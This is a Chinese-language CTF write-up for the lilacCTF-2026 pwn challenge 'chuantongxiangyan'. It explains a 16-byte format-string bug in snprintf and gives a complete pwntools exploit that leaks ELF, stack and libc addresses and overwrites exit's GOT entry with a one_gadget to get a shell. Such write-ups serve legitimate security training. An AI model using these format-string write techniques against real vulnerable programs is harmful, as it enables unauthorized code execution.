---
title: chuantongxiangyan
published: 2026-02-02
pinned: false
description: lilacCTF-2026 pwn fmt
tags:
  - pwn
category: ctf
author: wtt
draft: false
date: 2026-02-02
---
## 0x10 题目概述
这是lilacCTF-2026 的pwn题
题目限定每次只能写入16B 
题目代码：
```c
 v1 = readfsqword(0x28u);
  buffer_shadow = (__int64)buf;
  do
  {
    write(1, "Please input: \n", 0xFuLL);
    read(0, buf, 0x10uLL);
    snprintf(_bss_start, 0x10uLL, buf);
    write(1, _bss_start, 0x10uLL);
  }
  while ( (char *)buffer_shadow == buf );
  _exit(1);
}
```

开启的条件限制为：
```bash
	Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

## 0x20 利用思路
### 1. 泄露elf_base
第一次snprintf的时候泄露elf_base（等第二次snprintf的时候寄存器的值已经被修改了）

### 2.泄露stack_rsp
栈上的值对rsp的offset都是不固定的 ，并且【rbp】为0，此时观察寄存器rcx，r8，r9 刚好r9存储的栈地址相对于rsp的offset是固定的，所以第二次snprintf的时候泄露stack_rsp，栈上用%p打印的地址并没有指针效果

### 3.泄露libc_base(前提知道elf_base)
栈上寄存器上都没有 ，但是已经知道got表地址，通过%s泄露

Q:可以通过写got的方法 不需要libc_base 只需要覆盖已经延迟绑定后的函数got低位就能打one_gadget？

A:不行，一次性写不完got_write ,libc_offset =0x1148e0  ；one_gadget_libc_offset = 0xebc81
，修改不了这么多字节 如果写坏了got会导致整个程序流崩溃

Q:通过%xxc%5\$n+p64(got_exit)的形式直接写Got表？  
A:不行，因为payload长度限制，%c最多输出99(0x63)个字节，onegadget_libc_addr 高位地址一般是0x7f ，写不到这么多，就算爆破尝试到高位小于0x63也没用,因为其他低位也有可能会大于0x63  

Q:那么爆破一个每字节地址都小于0x63的libc地址？  
A:不行，因为这个libc 的每个onegadget_libc_addr的字节都大于0x63（概率较低）  

### 4.构造二级指针
寻找ptr_addr，其本来就指向栈上的一个地址（一级指针）  
此处选取rsp+0x38的地址作为ptr_addr  
![](../../images/Pasted%20image%2020260129211415.png)
用”%5\$hn“+p64(ptr_addr),构造二级指针 (输出0字节到【ptr_addr】写入4字节)  
修改为【ptr_addr】=  0x7fff37560000    
然后再通过”%11\$hn“去修改【0x7fff37560000】为got_exit  
再用”%1c%5\$hn“+p64(ptr_addr) 【ptr_addr】=  0x7fff37560001  
`不能用%hhn` 因为%hn加上%xc%5\$hn刚好8字节   
以上为一个循环，将【0x7fff37560000】写为got_exit   
通过”%xc%x\$hn“每2字节去写one_gadget（one_gadget地址6字节需要这样写3次）  
第二次循环，将【0x7fff37560000】写为got_exit +2 ，继续写one_gadget后2字节  
第三次循环，将【0x7fff37560000】写为got_exit +4 ，写one_gadget最后2字节  

跳出循环,进exit

## 0x30 利用脚本

```python
from pwn import *
# context(arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])

context.arch='amd64'
# context.log_level = 'debug'

challenge = "./pwn"

elf = ELF(challenge)
libc = ELF("./libc.so.6")
rop = ROP(libc)

inf     = lambda s                  :info(f"{s} ==> 0x{eval(s):x}")

while(1):
    # p = gdb.debug(challenge)
    p = process(challenge)
    # attach(p,'b *$rebase(0x10BC)')

    # p.send(b'12345678'*2)
    p.sendafter(b'Please input: \n',b'%1$p')
    recv_addr = int(p.recv(14),16)
    elf_base = recv_addr - 0x4020
    inf("elf_base")

    p.sendafter(b'Please input: \n',b'%3$p')
    recv_addr = int(p.recv(14),16)
    stack = recv_addr + 0x170
    inf("stack")

    p.sendafter(b'Please input: \n',b'%11$p')
    binsh_addr = int(p.recv(14),16)
    inf("binsh_addr")

    # /bin/sh_addr
    ptr_addr = stack + 0x38
    inf("ptr_addr")

    # payload = b'%5$hn'.ljust(8,b'\0') + p64(ptr_addr) 
    # p.sendafter(b'Please input: \n',payload)

    print("binsh_addr & ~0xffff")
    print(hex(binsh_addr & ~0xffff))
    # find a addr below stack which can use %$n find it
    if(binsh_addr & ~0xffff > stack):
        break   

    p.close()

# attach(p,'b *$rebase(0x10BC)')

got_write = elf_base + 0x4008
payload = b'%5$s'.ljust(8,b'\0') + p64(got_write)
p.sendafter(b'Please input: \n',payload)
libc_write = u64(p.recv(6).ljust(8,b'\0'))

libc_base = libc_write - 0x1148e0

got_exit = elf_base + 0x4000
inf("got_exit")

ogg_addr = libc_base + 0xebc81
inf("ogg_addr")


payloads = []
printed = 0

for j in range(6):
    if j == 0:
        fmt = f"%5$hn".encode()
        payload = fmt.ljust(8,b'\0') + p64(ptr_addr) 
        p.sendafter(b'Please input: \n',payload)
        byte = (got_exit >> (8*j)) & 0xff
        inf("byte")

        fmt = f"%11$hhn".encode()

        # control lenth
        assert len(fmt) <= 16, f"payload too long: {fmt}"

        payload = fmt.ljust(16,b'\0') 
        p.sendafter(b'Please input: \n',payload)
    else:
        fmt = f"%{j}c%5$hn".encode()
        payload = fmt.ljust(8,b'\0') + p64(ptr_addr) 
        p.sendafter(b'Please input: \n',payload)

        byte = (got_exit >> (8*j)) & 0xff
        inf("byte")
        
        if byte == 0:
            fmt = f"%11$hhn".encode()
        else:
            fmt = f"%{byte}c%11$hhn".encode()

        # control lenth
        assert len(fmt) <= 16, f"payload too long: {fmt}"

        payload = fmt.ljust(16,b'\0') 
        p.sendafter(b'Please input: \n',payload)


n = int(((binsh_addr & ~0xffff) - stack)/8 + 4)
print("n")
print(n)

# attach(p,'b *$rebase(0x10BC)')


num = ogg_addr  & 0xffff
fmt = f"%{num}c%{n}$hn".encode()
payload = fmt.ljust(8,b'\0') 
p.sendafter(b'Please input: \n',payload)

# 
for j in range(6):
    if j == 0:
        fmt = f"%5$hn".encode()
        payload = fmt.ljust(8,b'\0') + p64(ptr_addr) 
        p.sendafter(b'Please input: \n',payload)
        byte = ((got_exit+2) >> (8*j)) & 0xff
        inf("byte")
        #attention! it means lowest byte is 0x02  (aa)
        fmt = f"aa%11$hhn".encode()

        
        assert len(fmt) <= 16, f"payload too long: {fmt}"
        payload = fmt.ljust(16,b'\0') 
        p.sendafter(b'Please input: \n',payload)
    else:
        fmt = f"%{j}c%5$hn".encode()
        payload = fmt.ljust(8,b'\0') + p64(ptr_addr) 
        p.sendafter(b'Please input: \n',payload)

        byte = ((got_exit+2) >> (8*j)) & 0xff
        inf("byte")
        
        if byte == 0:
            fmt = f"%11$hhn".encode()
        else:
            fmt = f"%{byte}c%11$hhn".encode()

        # control lenth
        assert len(fmt) <= 16, f"payload too long: {fmt}"

        payload = fmt.ljust(16,b'\0') 
        p.sendafter(b'Please input: \n',payload)

n = int(((binsh_addr & ~0xffff) - stack)/8 + 4)
print("n")
print(n)

# attach(p,'b *$rebase(0x10BC)')

num = ogg_addr >>(16) & 0xffff
fmt = f"%{num}c%{n}$hn".encode()
payload = fmt.ljust(8,b'\0') 
p.sendafter(b'Please input: \n',payload)


for j in range(6):
    if j == 0:
        fmt = f"%5$hn".encode()
        payload = fmt.ljust(8,b'\0') + p64(ptr_addr) 
        p.sendafter(b'Please input: \n',payload)
        byte = ((got_exit+4) >> (8*j)) & 0xff
        inf("byte")

        #attention! it means lowest byte is 0x04  (aaaa)
        fmt = f"aaaa%11$hhn".encode()

        
        assert len(fmt) <= 16, f"payload too long: {fmt}"

        payload = fmt.ljust(16,b'\0') 
        p.sendafter(b'Please input: \n',payload)
    else:
        fmt = f"%{j}c%5$hn".encode()
        payload = fmt.ljust(8,b'\0') + p64(ptr_addr) 
        p.sendafter(b'Please input: \n',payload)

        byte = ((got_exit+4) >> (8*j)) & 0xff
        inf("byte")
        
        if byte == 0:
            fmt = f"%11$hhn".encode()
        else:
            fmt = f"%{byte}c%11$hhn".encode()

        # control lenth
        assert len(fmt) <= 16, f"payload too long: {fmt}"

        payload = fmt.ljust(16,b'\0') 
        p.sendafter(b'Please input: \n',payload)

n = int(((binsh_addr & ~0xffff) - stack)/8 + 4)
print("n")
print(n)

num = ogg_addr >>(32) & 0xffff
fmt = f"%{num}c%{n}$hn".encode()
payload = fmt.ljust(8,b'\0') 
p.sendafter(b'Please input: \n',payload)

attach(p,'b *$rebase(0x10BC)')
fmt = f"%5$n".encode()
payload = fmt.ljust(8,b'\0') +p64(elf_base + 0x4030)
p.sendafter(b'Please input: \n',payload)

p.interactive()

```


## 0x40 参考链接
[官方题解](https://lilachit.notion.site/Pwn-2f44c775ef0e80f4a06cdc1ad7e7aaca#2f44c775ef0e80dd91ebc7ba32bba9d4)
[星盟安全团队](https://blog.xmcve.com/tags/%E6%98%9F%E7%9B%9F%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F)